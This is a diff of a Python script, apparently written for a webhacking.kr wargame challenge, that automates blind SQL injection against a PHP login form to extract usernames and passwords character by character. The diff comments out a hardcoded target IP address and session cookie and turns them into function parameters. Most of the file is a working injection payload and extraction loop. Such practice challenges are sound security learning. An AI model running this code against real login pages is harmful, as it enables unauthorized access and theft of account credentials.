@@ -1,10 +1,10 @@
 import requests
 
 #url = 'https://webhacking.kr/challenge/bonus-1/index.php'
-url = 'http://104.197.42.200/member/login_ok.php'
-cookies = {'PHPSESSID': 'd42rp6qqm5fhj3dmn3830g74pq'}
+#url = 'http://104.197.42.200/member/login_ok.php'
+#cookies = {'PHPSESSID': 'd42rp6qqm5fhj3dmn3830g74pq'}
 
-def find_id_len():
+def find_id_len(url, cookies):
     id_len = 0
     while 1:
         id_len=id_len+1
@@ -23,9 +23,9 @@ def find_id_str(id_len):
         for ascii in range(97,123): #ascii a~z까지의 값 반복
             value = "' or ascii(substring(id,{},1)) = {} -- '".format(len,ascii)  
             params = {'userid': value, 'userpw': 'test'} 
-            response = requests.post(url, data=params, cookies=cookies)  
+            response = requests.post(url, data=params, cookies=cookies)
             print(response.status_code) 
-            print(value)  
+            print(value)
             if "wrong password" in response.text:  
                 id_str+=chr(ascii)+":" 
         id_str+="\n"
@@ -60,10 +60,3 @@ def find_pw_str(id, pw_len):
         pw_str+=chr(int(bincar, 2)) 
         print("현재 패스워드" + pw_str) 
     return pw_str # PW 반환
-
-
-if __name__ == '__main__':
-    #admin_len = find_pw_len("admin")
-   # guest_len = find_pw_len("guest")
-    print("아이디 조합 : \n"+find_id_str(find_id_len()))
-    #print("admin_pw : "+find_pw_str(id="admin",pw_len=admin_len)+"\nguest_pw : "+find_pw_str(id="guest",pw_len=guest_len))
